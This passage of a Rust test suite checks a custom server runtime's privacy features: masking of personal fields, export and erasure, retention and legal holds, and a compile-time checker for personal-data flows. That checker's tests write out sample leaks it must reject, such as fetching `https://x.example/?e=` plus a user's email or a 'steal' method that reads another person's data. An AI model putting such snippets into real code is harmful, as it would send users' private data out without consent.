    let mut rt = server(src, false);
    let anon = || who("", &[]);
    assert!(call_as(&mut rt, 1.0, "Till/a", "pay", json!([5]), anon()).is_ok());
    assert!(call_as(&mut rt, 2.0, "Till/a", "pay", json!([0]), anon()).is_err());
    assert_eq!(call_as(&mut rt, 3.0, "Till/a", "refund", json!([]), anon()).unwrap_err().0, Some(403));
    // Unknown names are refused like any other, but never counted, so requests cannot grow
    // the table.
    assert!(call_as(&mut rt, 4.0, "Till/a", "nope", json!([]), anon()).is_err());
    assert!(call_as(&mut rt, 4.0, "Nope/a", "pay", json!([1]), anon()).is_err());
    rt.handle(1500.0, Input::Tick);

    let s = rt.stats();
    let pay = &s["methods"]["Till.pay"];
    assert_eq!((pay["calls"].clone(), pay["errors"].clone(), pay["refused"].clone()), (json!(2), json!(1), json!(0)));
    assert!(pay["steps"].as_u64().unwrap() > 0, "{s}");
    assert_eq!(s["methods"]["Till.refund"], json!({ "calls": 0, "errors": 0, "refused": 1, "steps": 0 }));
    assert_eq!(s["methods"]["Till.check"]["calls"], json!(1), "timers count too");
    assert_eq!(s["methods"].as_object().unwrap().len(), 3, "{s}");
    assert_eq!((s["objects"].clone(), s["waiting"].clone()), (json!({ "Till": 1 }), json!({})));
    assert_eq!(rt.inspect()["stats"], s, "inspect carries them on every host");

    assert_eq!(rt.method_name("Till/x", "pay").as_deref(), Some("Till.pay"));
    assert_eq!((rt.method_name("Till/x", "nope"), rt.method_name("Nope/x", "pay")), (None, None));
}

#[test]
fn caller_belongs_to_each_call_alarms_and_timers() {
    let mut rt = server(GUARDED, false);
    // Two interleaved async calls from different callers keep their own caller.
    let slow = |rt: &mut Runtime, now: f64, id: &str| {
        let out = rt.handle(now, Input::Call { object: "Board/main".into(), method: "slow".into(), args: vec![], reply: None, call: None, caller: who(id, &[]) });
        out.iter().find_map(|o| if let Output::Effect { id, .. } = o { Some(*id) } else { None }).unwrap()
    };
    let (a, b) = (slow(&mut rt, 1.0, "user:ana"), slow(&mut rt, 1.0, "user:bo"));
    rt.handle(2.0, answered(b, json!({ "status": 200, "headers": {}, "body": "" })));
    rt.handle(3.0, answered(a, json!({ "status": 200, "headers": {}, "body": "" })));
    // An alarm runs as whoever scheduled it; @every timers run as the system.
    call_as(&mut rt, 4.0, "Board/main", "later", json!([10]), who("user:cy", &[])).unwrap();
    rt.handle(1100.0, Input::Tick);
    let s = state(&mut rt, 1200.0, "Board/main");
    assert_eq!(s["by"], json!(["slow:user:bo", "slow:user:ana", "alarm:user:cy"]));
    assert_eq!(s["lastTick"], json!("system"));
}

/// For a server's audit log: calls nobody requested report how they ended (agent tools, run
/// by `invoke`, in the agent test below). Requests do not; the server logs those itself.
#[test]
fn servers_report_timers_and_alarms_as_they_end() {
    let src = r#"
@server @read("anyone") object Desk {
  n: number = 0
  @allow("anyone") bump() { this.n += 1 }
  @allow("signedIn") later(ms: number) { this.schedule(ms, "boom") }
  private boom() { throw new Error("a secret detail") }
  @every("1s") tick() { this.n += 1 }
}
"#;
    let ran = |out: &[Output]| -> Vec<Json> { out.iter().filter(|o| matches!(o, Output::Ran { .. })).map(|o| serde_json::to_value(o).unwrap()).collect() };
    let mut rt = server(src, false);
    let out = rt.handle(1.0, Input::Call { object: "Desk/a".into(), method: "bump".into(), args: vec![], reply: Some(1), call: None, caller: who("user:ana", &[]) });
    assert!(ran(&out).is_empty(), "requests are logged where they arrive");
    call_as(&mut rt, 2.0, "Desk/a", "later", json!([10]), who("user:bo", &[])).unwrap();
    let out = rt.handle(1500.0, Input::Tick);
    assert_eq!(
        ran(&out),
        [
            json!({ "type": "ran", "object": "Desk/a", "method": "boom", "by": "alarm", "caller": "user:bo", "ok": false, "ms": 0 }),
            json!({ "type": "ran", "object": "Desk/a", "method": "tick", "by": "timer", "ok": true, "ms": 0 }),
        ],
        "never error text"
    );

    // Devices keep no audit log.
    let mut device = Runtime::boot(compile(src).unwrap(), Box::new(Shared::default()), Options { render: false, ..Options::new(0.0, 7) }).unwrap().0;
    assert!(ran(&device.handle(1000.0, Input::Tick)).is_empty());
}

#[test]
fn crypto_needs_the_hosts_random_bytes_and_matches_the_standards() {
    // The example from docs/language.md.
    let src = r#"
/// No @read and no @allow: only server code reaches it, and TJ_KEY_FILE encrypts it at rest.
@server object Keys {
  invites: string = ""
  invite(): string {
    if (this.invites === "") { this.invites = crypto.randomId() }
    return this.invites
  }
}

@server @read("staff") object Invites {
  codes: string[] = []
  @allow("staff") create(): string {
    const code = crypto.randomId()
    this.codes.push(crypto.hmac(Keys.get("main").invite(), code))   // only the HMAC is stored
    return code
  }
  @allow("anyone") check(code: string): boolean {
    const mac = crypto.hmac(Keys.get("main").invite(), code)
    return this.codes.some(c => crypto.timingSafeEqual(c, mac))
  }
  @allow("anyone") vector(): string { return crypto.hmac("Jefe", "what do ya want for nothing?") }
}
"#;
    let mut rt = server(src, false);
    let staff = || who("key:ops", &["staff"]);
    let refused = call_as(&mut rt, 1.0, "Invites/i", "create", json!([]), staff()).unwrap_err().1;
    assert!(refused.contains("`entropy` input"), "without the host's bytes, no ids: {refused}");
    assert!(rt.handle(1.0, Input::Entropy { bytes: "ab".into() }).iter().any(|o| matches!(o, Output::Error { .. })), "too few bytes");

    rt.handle(1.0, Input::Entropy { bytes: "07".repeat(32) });
    let code = call_as(&mut rt, 2.0, "Invites/i", "create", json!([]), staff()).unwrap();
    let code = code.as_str().unwrap().to_string();
    assert!(code.len() == 32 && code.bytes().all(|b| b.is_ascii_hexdigit()), "{code}");
    assert_ne!(json!(code), call_as(&mut rt, 2.0, "Invites/i", "create", json!([]), staff()).unwrap());
    assert_eq!(call_as(&mut rt, 3.0, "Invites/i", "check", json!([code]), who("", &[])), Ok(json!(true)));
    assert_eq!(call_as(&mut rt, 3.0, "Invites/i", "check", json!(["0".repeat(32)]), who("", &[])), Ok(json!(false)));
    assert!(!state(&mut rt, 4.0, "Invites/i").to_string().contains(&code), "only HMACs are stored");
    assert_eq!(call_as(&mut rt, 4.0, "Keys/main", "invite", json!([]), staff()).unwrap_err().0, Some(403), "keys stay on the server");
    // RFC 4231, case 2.
    assert_eq!(call_as(&mut rt, 5.0, "Invites/i", "vector", json!([]), who("", &[])), Ok(json!("5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843")));
}

#[test]
fn fetch_warns_once_per_plain_http_origin() {
    let src = r#"
@server @read("anyone") object Feed {
  @allow("anyone") async pull(url: string) { await fetch(url) }
}
"#;
    let mut rt = server(src, false);
    let mut warned = |url: &str| -> Vec<String> {
        let out = rt.handle(1.0, Input::Call { object: "Feed/f".into(), method: "pull".into(), args: vec![json!(url)], reply: None, call: None, caller: who("", &[]) });
        out.into_iter().filter_map(|o| if let Output::Log { level, message } = o { (level == "warn").then_some(message) } else { None }).collect()
    };
    assert_eq!(warned("http://feeds.example.com:8080/a?x=1"), ["fetch uses plain HTTP to feeds.example.com:8080: anyone on the way can read and change it; use https://"]);
    assert!(warned("http://feeds.example.com:8080/b").is_empty(), "once per origin");
    for quiet in ["https://feeds.example.com/a", "http://localhost:4700/x", "http://127.0.0.1/x", "http://[::1]:80/x", "http://10.0.2.2:4700/x"] {
        assert!(warned(quiet).is_empty(), "{quiet}");
    }
}

const ACCOUNTS: &str = r#"
@server @read("owner", "support") object Account {
  @pii("contact", "account") email: string = ""
  @pii("health", "care") notes: string = ""
  plan: string = "free"
  @allow("owner") set(email: string, notes: string) {
    this.email = email
    this.notes = notes
    this.schedule(60000, "remind")
  }
  @allow("owner") async check() { await fetch("https://example.com/verify") }
  private remind() { this.plan = "reminded" }
}
"#;

#[test]
fn personal_data_reaches_its_owner_only() {
    let mut rt = server(ACCOUNTS, false);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1.0, "Account/user:ana", "set", json!(["ana@example.com", "allergic to nuts"]), ana()).unwrap();
    let get = |rt: &mut Runtime, caller: Option<Caller>| reply(&rt.handle(2.0, Input::Get { object: "Account/user:ana".into(), reply: Some(1), caller })).unwrap();
    assert_eq!(get(&mut rt, ana()), json!({ "email": "ana@example.com", "notes": "allergic to nuts", "plan": "free" }));
    let masked = json!({ "email": "•••", "notes": "•••", "plan": "free" });
    assert_eq!(get(&mut rt, who("key:desk", &["support"])), masked, "a role that may read sees the rest");
    assert_eq!(get(&mut rt, Some(Caller::trusted())), masked, "tools too");
    let inspected = rt.inspect()["objects"].to_string();
    assert!(inspected.contains("•••") && !inspected.contains("ana@example.com"), "{inspected}");
}

#[test]
fn a_person_can_be_exported_and_erased() {
    let store = Shared::default();
    let boot = || Runtime::boot(compile(ACCOUNTS).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    let ana = || who("user:ana", &[]);
    let mut rt = boot();
    call_as(&mut rt, 1.0, "Account/user:ana", "set", json!(["ana@example.com", "allergic"]), ana()).unwrap();
    call_as(&mut rt, 1.0, "Account/user:bo", "set", json!(["bo@example.com", ""]), who("user:bo", &[])).unwrap();

    // Export: everything held about one person, unmasked, from memory or the store.
    let mut fresh = boot();
    assert_eq!(fresh.export_subject("user:ana").unwrap(), json!({ "Account/user:ana": { "email": "ana@example.com", "notes": "allergic", "plan": "free" } }));
    assert_eq!(fresh.export_subject("user:nobody").unwrap(), json!({}));

    // Not while a call is part way through the object.
    let pending = rt.handle(2.0, Input::Call { object: "Account/user:ana".into(), method: "check".into(), args: vec![], reply: Some(5), call: None, caller: ana() });
    let effect = pending.iter().find_map(|o| if let Output::Effect { id, .. } = o { Some(*id) } else { None }).unwrap();
    assert_eq!(rt.erase_subject("user:ana", None).err().map(|e| e.0), Some(409));
    rt.handle(3.0, answered(effect, json!({ "status": 200, "headers": {}, "body": "" })));

    // Erase: back to the defaults, alarms gone, and replicas hear of it as a deletion.
    let e = rt.erase_subject("user:ana", None).unwrap();
    let (erased, out) = (e.erased, e.outputs);
    assert_eq!(erased, ["Account/user:ana"]);
    let change = out.iter().find_map(|o| if let Output::Changed { object, state, seq } = o { Some((object.clone(), state.clone(), *seq)) } else { None }).expect("replicas hear of it");
    assert_eq!((change.0.as_str(), &change.1), ("Account/user:ana", &Json::Null));
    let stored = store.0.borrow().data.get("Account/user:ana").cloned().unwrap();
    assert!(!stored.contains("ana@example.com") && !stored.contains("\"alarms\":[{"), "{stored}");
    assert_eq!(boot().export_subject("user:ana").unwrap()["Account/user:ana"]["email"], json!(""), "after a restart too");
    assert_eq!(boot().export_subject("user:bo").unwrap()["Account/user:bo"]["email"], json!("bo@example.com"), "nobody else");
    // A device that reconnects later resumes after its change number and gets the blank.
    assert!(rt.changed_since(&["Account/user:ana".into()], change.2 - 1).len() == 1);
}

#[test]
fn a_failed_erasure_erases_nothing() {
    let store = Flaky::default();
    let mut rt = Runtime::boot(compile(ACCOUNTS).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    call_as(&mut rt, 1.0, "Account/user:ana", "set", json!(["ana@example.com", ""]), who("user:ana", &[])).unwrap();
    store.1.set(true);
    assert_eq!(rt.erase_subject("user:ana", None).err().map(|e| e.0), Some(503));
    store.1.set(false);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Account/user:ana"]["email"], json!("ana@example.com"), "and says so, rather than claiming it worked");
    rt.handle(61_000.0, Input::Tick);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Account/user:ana"]["plan"], json!("reminded"), "its alarms still run");
}

/// A server runs every object on one thread, so a runaway call is stopped sooner there
/// (about 0.3 s), and the server answers the next call as usual.
#[test]
fn a_runaway_call_on_a_server_fails_and_the_server_carries_on() {
    let src = r#"
@server @read("anyone") object Spin {
  n: number = 0
  @allow("anyone") forever() { while (true) { this.n += 1 } }
  @allow("anyone") ok(): string { return "alive" }
}
"#;
    let mut rt = server(src, false);
    let err = call_as(&mut rt, 1.0, "Spin/s", "forever", json!([]), who("", &[])).unwrap_err().1;
    assert!(err.contains("ran too long"), "{err}");
    let steps = rt.stats()["methods"]["Spin.forever"]["steps"].as_u64().unwrap();
    assert!((20_000_000..20_000_100).contains(&steps), "{steps}");
    assert_eq!(call_as(&mut rt, 2.0, "Spin/s", "ok", json!([]), who("", &[])), Ok(json!("alive")));
    // Failed calls roll back uncommitted mutations atomically (atomic turns).
    assert_eq!(state(&mut rt, 3.0, "Spin/s")["n"].as_u64().unwrap(), 0);
}

/// The account object the flow tests build on.
const PII_ACCOUNT: &str = r#"
@server @read("owner", "support") object Account {
  @pii("contact", "account", "billing") email: string = ""
  @pii("health", "care") notes: string = ""
  @pii("contact", "account") phones: string[] = []
  plan: string = "free"
  label: string = ""
"#;

/// Compiles PII_ACCOUNT plus `members` (inside Account) and `rest` (after it); the errors.
fn flow(members: &str, rest: &str) -> String {
    let src = format!("{PII_ACCOUNT}{members}\n}}\n{rest}");
    compile(&src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("\n")).unwrap_or_default()
}

#[test]
fn personal_data_cannot_leave_without_a_purpose() {
    // The plain sinks.
    let leaks = [
        (r#"@allow("owner") async send() { await fetch("https://x.example/?e=" + this.email) }"#, "reaches `fetch`"),
        (r#"@allow("owner") tell() { this.emit("changed", { e: this.email }) }"#, "reaches `emit`"),
        (r#"@allow("owner") fail() { throw new Error(`bad ${this.email}`) }"#, "reaches an error message"),
        (r#"@allow("owner") log() { console.log(this.notes) }"#, "reaches the log"),
        (r#"@allow("owner") copy() { this.label = this.email }"#, "reaches `this.label`, which is not marked as personal data"),
        (r#"@allow("owner") later() { this.schedule(1000, "ping", this.email) }
  private ping(e: string) { }"#, "reaches an alarm's arguments"),
        (r#"@allow("anyone") show(): string { return this.email }"#, "is returned here to callers who do not own it"),
        (r#"@allow("owner", "support") whole(): string { return JSON.stringify(this) }"#, "is returned here"),
    ];
    for (code, want) in leaks {
        let e = flow(code, "");
        assert!(e.contains(want), "{code}\n=> {e}");
        assert!(e.contains("with the purpose it is sent for (account, billing)") || e.contains("reveal(value, \"care\")") || e.contains("different purposes"), "{e}");
    }

    // critic-reply-006 L1: someone else's data through an owner-only method.
    let e = flow(r#"@allow("owner") peek(victim: string): string { return Account.get(victim).email }"#, "");
    assert!(e.contains("may be about someone other than the caller"), "{e}");
    let e = flow(r#"@allow("owner") steal(victim: string) { this.email = Account.get(victim).email }"#, "");
    assert!(e.contains("may be about someone other than the owner of the object it is written into (`this.email`)"), "{e}");
    // L2: through a container filled in another function.
    let e = flow(r#"@allow("owner") run() {
    const box: string[] = []
    collect(box, this)
    this.emit("ev", box)
  }"#, "function collect(out: string[], a: Account) { out.push(a.email) }");
    assert!(e.contains("reaches `emit`"), "{e}");
    // L3: a module-level variable.
    let e = flow(r#"@allow("owner") keep() { stash = this.email }"#, "let stash: string = \"\"");
    assert!(e.contains("the module-level variable `stash`"), "{e}");
    let e = flow(r#"@allow("owner") keep() { box.push(this.email) }"#, "const box: string[] = []");
    assert!(e.contains("the module-level variable `box`"), "{e}");
    // L4: the whole object, and a tool that hands it to the AI model.
    let e = flow(r#"@allow("owner") all() { this.emit("x", `${this}`) }"#, "");
    assert!(e.contains("the whole Account object"), "{e}");
    let e = flow(r#"@allow("owner") myEmail(): string { return this.email }"#, r#"
const tools = [{ name: "email", object: "Account/me", method: "myEmail", description: "", params: [], input: {}, fixed: {} }]"#);
    assert!(e.contains("the tool Account.myEmail returns") && e.contains("AI model"), "{e}");
    for object in ["`Account/${caller.id}`", "\"Account/\" + caller.id"] {
        let tools = format!("function tools() {{ return [{{ name: \"email\", object: {object}, method: \"myEmail\", description: \"\", params: [], input: {{}}, fixed: {{}} }}] }}");
        let e = flow(r#"@allow("owner") myEmail(): string { return this.email }"#, &tools);
        assert!(e.contains("the tool Account.myEmail returns"), "{object}: {e}");
    }

    // critic-008: a nested function and a callback see the outer variables.
    let e = flow(r#"@allow("anyone") leak(id: string): string {
    const e = Account.get(id).email
    function read(): string { return e }
    return read()
  }"#, "");
    assert!(e.contains("is returned here to callers who do not own it"), "{e}");
    let e = flow(r#"@allow("owner") leak() {
    let out = ""
    ;[1].forEach(x => { out = this.email })
    this.emit("ev", out)
  }"#, "");
    assert!(e.contains("reaches `emit`"), "{e}");
    // Into another object, directly or through a variable.
    let room = r#"@server @read("anyone") object Room { messages: string[] = [] }"#;
    let e = flow(r#"@allow("owner") post() { Room.get("lobby").messages.push(this.email) }"#, room);
    assert!(e.contains("reaches `Room.messages`, which is not marked as personal data"), "{e}");
    let e = flow(r#"@allow("owner") post() {
    const r = Room.get("lobby")
    r.messages.push(this.email)
  }"#, room);
    assert!(e.contains("reaches `Room.messages`"), "{e}");
    // A tool whose object it cannot read is reported, not skipped.
    let e = flow(r#"@allow("owner") myEmail(): string { return this.email }"#, r#"
function tools(o: string) { return [{ name: "email", object: o, method: "myEmail", description: "", params: [], input: {}, fixed: {} }] }"#);
    assert!(e.contains("cannot follow this tool's object"), "{e}");

    // What tj:privacy exports is all of a person's data: theirs to them, nobody else's.
    let export = "import { exportData } from \"tj:privacy\"\n";
    let e = flow(r#"@allow("owner") async mine(): any { return await exportData(caller.id) }"#, export);
    assert_eq!(e, "", "a person's own data, to them");
    let e = flow(r#"@allow("owner") async mine(): any { return await exportData(this.id) }"#, export);
    assert_eq!(e, "", "this.id is the owner's id in an owner-only method");
    let e = flow(r#"@allow("support") async look(id: string): any { return await exportData(id) }"#, export);
    assert!(e.contains("exportData(...)") && e.contains("is returned here to callers who do not own it"), "{e}");

    // A list from Class.all() may be anyone's: personal fields from it are other people's,
    // the rest are not personal at all.
    let e = flow(r#"@allow("signedIn") everyone(): string[] { return Account.all().map(a => a.email) }"#, "");
    assert!(e.contains("is returned here to callers who do not own it"), "{e}");
    let e = flow(r#"@allow("signedIn") plans(): string[] { return Account.all().filter(a => a.plan !== "").map(a => a.plan) }"#, "");
    assert_eq!(e, "", "plain fields of anyone's objects are not personal data");
    // reduce's callback takes the accumulator first: the element is still anyone's object.
    let e = flow(r#"@allow("signedIn") joined(): string { return Account.all().reduce((acc, a) => acc + a.email, "") }"#, "");
    assert!(e.contains("is returned here to callers who do not own it"), "{e}");
    let e = flow(r#"@allow("signedIn") both(): any { return Account.all().concat(Account.all().map(a => a.email)) }"#, "");
    assert!(e.contains("is returned here"), "concat's argument is checked: {e}");

    // Purposes are enforced, and mixing fields for different purposes is refused.
    assert_eq!(flow(r#"@allow("owner") async bill() { await fetch("https://pay.example/?e=" + reveal(this.email, "billing")) }"#, ""), "");
    let e = flow(r#"@allow("owner") async ad() { await fetch("https://ads.example/?e=" + reveal(this.email, "ads")) }"#, "");
    assert!(e.contains("\"ads\" is not a purpose of this personal data: Account.email is for account, billing"), "{e}");
    let e = flow(r#"@allow("owner") async both() { await fetch(reveal(`${this.email} ${this.notes}`, "account")) }"#, "");
    assert!(e.contains("different purposes"), "{e}");
}

#[test]
fn correct_code_with_personal_data_compiles() {
    let ok = [
        // F1: a helper that only reads what is not personal.
        (r#"@allow("support") canUpgrade(id: string): boolean { return !isPaid(Account.get(id)) }"#, "function isPaid(a: Account): boolean { return a.plan !== \"free\" }"),
        // F2: array callbacks over personal data, kept in a personal field.
        (r#"@allow("owner") removePhone(p: string) { this.phones = this.phones.filter(x => x !== p) }"#, ""),
        // F3: whether a field is filled in, and errors that do not contain it.
        (r#"@allow("owner") ensure() { if (this.email === "") { throw new Error("please add an email") } }
  @allow("owner", "support") hasEmail(): boolean { return this.email !== "" }"#, ""),
        // F4: the owner's own data back to the owner, and on screen.
        (r#"@allow("owner") mine(): string { return this.email }
  @allow("owner") setEmail(e: string) { this.email = e.trim() }"#, r#"
const me = Account.get("me")
export function App() { return <Column><Text>{me.email}</Text></Column> }"#),
        // Reading through the caller's own id in an owner-only method.
        (r#"@allow("owner") echo(): string { return Account.get(caller.id).email }"#, ""),
    ];
    for (members, rest) in ok {
        assert_eq!(flow(members, rest), "", "{members}");
    }
    // Apps without personal data are not checked at all.
    assert!(compile("object A { n: number = 0\n  f() { console.log(this.n) } }").is_ok());
}

/// Only an object's own methods change its fields, containers included: from outside, they
/// are read-only views (critic-008, builder-reply-007-008).
#[test]
fn other_objects_fields_are_read_only_from_outside() {
    let src = r#"
type Msg = { text: string }
@server @read("anyone") object Room {
  messages: Msg[] = [{ text: "hello" }]
  meta: { tags: string[] } = { tags: [] }
  @allow("anyone") post(text: string) { this.messages.push({ text: text }) }
  list(): Msg[] { return this.messages }
  fresh(): Msg[] { return this.messages.filter(m => m.text !== "") }
  first(): Msg { return this.messages[0] }
  wrapped(): { list: Msg[] } { return { list: this.messages } }
  looped(): any {
    const w: any = { list: this.messages }
    w.self = w
    return w
  }
}
@server @read("anyone") object Poster {
  @allow("anyone") direct() { Room.get("lobby").messages.push({ text: "x" }) }
  @allow("anyone") alias() { const m = Room.get("lobby").messages; m.push({ text: "x" }) }
  @allow("anyone") nested() { Room.get("lobby").meta.tags.push("x") }
  @allow("anyone") element() { Room.get("lobby").messages[0].text = "changed" }
  @allow("anyone") returned() { Room.get("lobby").list().push({ text: "x" }) }
  @allow("anyone") firstOne() { Room.get("lobby").first().text = "changed" }
  @allow("anyone") wrapper(): number {
    const w = Room.get("lobby").wrapped()
    w.list.push({ text: "x" })
    return 0
  }
  @allow("anyone") looped() { Room.get("lobby").looped().self.list.push({ text: "x" }) }
  @allow("anyone") values() { Object.values(Room.get("lobby").meta)[0].push("x") }
  @allow("anyone") entries() { Object.entries(Room.get("lobby").meta)[0][1].push("x") }
  @allow("anyone") sorted() { Room.get("lobby").meta.tags.sort((a, b) => 0) }
  @allow("anyone") newWrapper(): number {
    const w = Room.get("lobby").wrapped()
    w.list = []
    return w.list.length + 1
  }
  @allow("anyone") copy(): number {
    const c = Room.get("lobby").messages.slice()
    c.push({ text: "mine" })
    return c.length
  }
  @allow("anyone") copyInside() { const c = [...Room.get("lobby").messages]; c[0].text = "changed" }
  @allow("anyone") freshResult(): number {
    const f = Room.get("lobby").fresh()
    f.push({ text: "mine" })
    return f.length
  }
}
"#;
    let mut rt = server(src, false);
    let anyone = || who("", &[]);
    for method in ["direct", "alias", "nested", "element", "returned", "copyInside", "firstOne", "wrapper", "looped", "values", "entries", "sorted"] {
        let err = call_as(&mut rt, 1.0, "Poster/p", method, json!([]), anyone()).unwrap_err().1;
        assert!(err.contains("only that object's own methods can change it"), "{method}: {err}");
    }
    assert_eq!(call_as(&mut rt, 2.0, "Poster/p", "copy", json!([]), anyone()), Ok(json!(2)), "a copy is the caller's");
    assert_eq!(call_as(&mut rt, 2.0, "Poster/p", "freshResult", json!([]), anyone()), Ok(json!(2)), "so is a new array a method returns");
    assert_eq!(call_as(&mut rt, 2.0, "Poster/p", "newWrapper", json!([]), anyone()), Ok(json!(1)), "and a new record around Room's data");
    call_as(&mut rt, 3.0, "Room/lobby", "post", json!(["hi"]), anyone()).unwrap();
    let room = state(&mut rt, 4.0, "Room/lobby");
    assert_eq!(room["messages"], json!([{ "text": "hello" }, { "text": "hi" }]), "only Room's own method changed it");
    assert_eq!(room["meta"], json!({ "tags": [] }));
}

const DAY: f64 = 86_400_000.0;

const KEPT: &str = r#"
@server @read("owner") @retain("1d") object Visit {
  @pii("location", "service") place: string = ""
  @allow("owner") set(p: string) { this.place = p }
  @allow("owner") async check() { await fetch("https://maps.example.com/") }
}
@server @read("owner") @retain("1d", "created") object Signup {
  note: string = ""
  @allow("owner") set(n: string) { this.note = n }
}
@server @read("owner") @legalHold("30d") object Invoice {
  @pii("financial", "billing") amount: number = 0
  @allow("owner") bill(n: number) { this.amount = n }
}
@server @read("owner") object Account {
  @pii("contact", "account") email: string = ""
  @allow("owner") set(e: string) { this.email = e }
}
@server @read("anyone") object Board {
  pings: number = 0
  @allow("signedIn") later() { this.schedule(5 * 86400000, "ping") }
  private ping() { this.pings += 1 }
}
"#;

fn kept(store: &Shared, now: f64) -> Runtime {
    Runtime::boot(compile(KEPT).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(now, 7) }).unwrap().0
}

fn erased_outputs(out: &[Output]) -> Vec<(String, String)> {
    out.iter().filter_map(|o| if let Output::Erased { object, reason, .. } = o { Some((object.clone(), reason.clone())) } else { None }).collect()
}

#[test]
fn retention_erases_on_time_and_never_twice() {
    let store = Shared::default();
    let mut rt = kept(&store, 0.0);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1000.0, "Visit/user:ana", "set", json!(["Riyadh"]), ana()).unwrap();
    call_as(&mut rt, 1000.0, "Signup/user:ana", "set", json!(["a"]), ana()).unwrap();
    // "changed" counts from the last change; "created" does not move.
    call_as(&mut rt, 0.8 * DAY, "Visit/user:ana", "set", json!(["Jeddah"]), ana()).unwrap();
    call_as(&mut rt, 0.8 * DAY, "Signup/user:ana", "set", json!(["b"]), ana()).unwrap();
    let out = rt.handle(1.2 * DAY, Input::Tick);
    assert_eq!(erased_outputs(&out), [("Signup/user:ana".into(), "retain".into())]);
    let out = rt.handle(1.9 * DAY, Input::Tick);
    assert_eq!(erased_outputs(&out), [("Visit/user:ana".into(), "retain".into())]);
    // Someone who comes back starts a fresh clock, even when it counts from creation.
    call_as(&mut rt, 3.5 * DAY, "Signup/user:ana", "set", json!(["back"]), ana()).unwrap();
    assert!(erased_outputs(&rt.handle(4.0 * DAY, Input::Tick)).is_empty(), "not erased the day after coming back");
    assert_eq!(erased_outputs(&rt.handle(4.6 * DAY, Input::Tick)), [("Signup/user:ana".into(), "retain".into())]);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Visit/user:ana"]["place"], json!(""));
    // A blank object is not erased again every hour.
    for hour in 1..30 {
        assert!(erased_outputs(&rt.handle(1.9 * DAY + f64::from(hour) * 3_600_000.0, Input::Tick)).is_empty());
    }
}

#[test]
fn retention_reads_records_without_loading_them_and_dates_old_ones() {
    let store = Shared::default();
    call_as(&mut kept(&store, 0.0), 1000.0, "Visit/user:bo", "set", json!(["Dammam"]), who("user:bo", &[])).unwrap();
    // A record from before times were kept counts from when it is first seen.
    store.0.borrow_mut().data.insert("Visit/user:old".into(), r#"{"state":{"place":"Abha"},"seq":1}"#.into());

    let mut rt = kept(&store, 2.0 * DAY);
    let out = rt.handle(2.0 * DAY, Input::Tick);
    assert_eq!(erased_outputs(&out), [("Visit/user:bo".into(), "retain".into())]);
    assert!(rt.inspect()["objects"].as_array().unwrap().is_empty(), "nothing was loaded into memory");
    let bo: Json = serde_json::from_str(&store.0.borrow().data["Visit/user:bo"]).unwrap();
    assert_eq!(bo["state"], json!({ "place": "" }));
    let old: Json = serde_json::from_str(&store.0.borrow().data["Visit/user:old"]).unwrap();
    assert_eq!((old["state"]["place"].clone(), old["created"].as_f64()), (json!("Abha"), Some(2.0 * DAY)), "dated, not erased");
    let out = rt.handle(3.1 * DAY, Input::Tick);
    assert_eq!(erased_outputs(&out), [("Visit/user:old".into(), "retain".into())]);
}

#[test]
fn retention_waits_for_a_call_part_way_through_and_an_erase_typo_spares_shared_objects() {
    let store = Shared::default();
    let mut rt = kept(&store, 0.0);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1000.0, "Visit/user:ana", "set", json!(["Riyadh"]), ana()).unwrap();
    let out = rt.handle(2000.0, Input::Call { object: "Visit/user:ana".into(), method: "check".into(), args: vec![], reply: Some(9), call: None, caller: ana() });
    let effect = fetches(&out)[0];
    assert!(erased_outputs(&rt.handle(1.5 * DAY, Input::Tick)).is_empty(), "not while a call is part way through");
    rt.handle(1.5 * DAY, answered(effect, json!({ "status": 200, "headers": {}, "body": "" })));
    assert_eq!(erased_outputs(&rt.handle(1.5 * DAY + 3_600_000.0, Input::Tick)), [("Visit/user:ana".into(), "retain".into())]);

    // `tj privacy erase main` by mistake: Board/main belongs to nobody, so it is untouched.
    call_as(&mut rt, 2.0 * DAY, "Board/main", "later", json!([]), ana()).unwrap();
    assert!(rt.erase_subject("main", None).unwrap().erased.is_empty());
}

#[test]
fn retention_works_in_batches_so_the_server_keeps_answering() {
    let store = Shared::default();
    for i in 0..1100 {
        store.0.borrow_mut().data.insert(format!("Visit/user:{i}"), r#"{"state":{"place":"x"},"seq":1,"created":1000,"changed":1000}"#.into());
    }
    let mut rt = kept(&store, 2.0 * DAY);
    let mut per_tick = Vec::new();
    for step in 0..4 {
        per_tick.push(erased_outputs(&rt.handle(2.0 * DAY + f64::from(step), Input::Tick)).len());
    }
    assert_eq!(per_tick, [500, 500, 100, 0]);
}

#[test]
fn a_legal_hold_keeps_records_until_it_ends_then_the_erasure_happens() {
    let store = Shared::default();
    let mut rt = kept(&store, 0.0);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1000.0, "Invoice/user:ana", "bill", json!([120]), ana()).unwrap();
    call_as(&mut rt, 1000.0, "Account/user:ana", "set", json!(["ana@example.com"]), ana()).unwrap();
    let e = rt.erase_subject("user:ana", None).unwrap();
    assert_eq!(e.erased, ["Account/user:ana"]);
    assert_eq!(e.held, [("Invoice/user:ana".to_string(), 1000.0 + 30.0 * DAY)]);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Invoice/user:ana"]["amount"], json!(120), "kept while held");

    // The waiting erasure survives a restart, and happens when the hold ends.
    let mut rt = kept(&store, 10.0 * DAY);
    assert!(erased_outputs(&rt.handle(10.0 * DAY, Input::Tick)).is_empty());
    let out = rt.handle(31.0 * DAY, Input::Tick);
    assert_eq!(erased_outputs(&out), [("Invoice/user:ana".into(), "erase after hold".into())]);
    assert_eq!(rt.export_subject("user:ana").unwrap()["Invoice/user:ana"]["amount"], json!(0));
}

/// A store that notes what it was asked to forget (an encrypted store destroys those keys).
#[derive(Clone, Default)]
struct Forgetful(Shared, Rc<RefCell<Vec<String>>>);

impl Store for Forgetful {
    fn load(&mut self, key: &str) -> Result<Option<String>, String> {
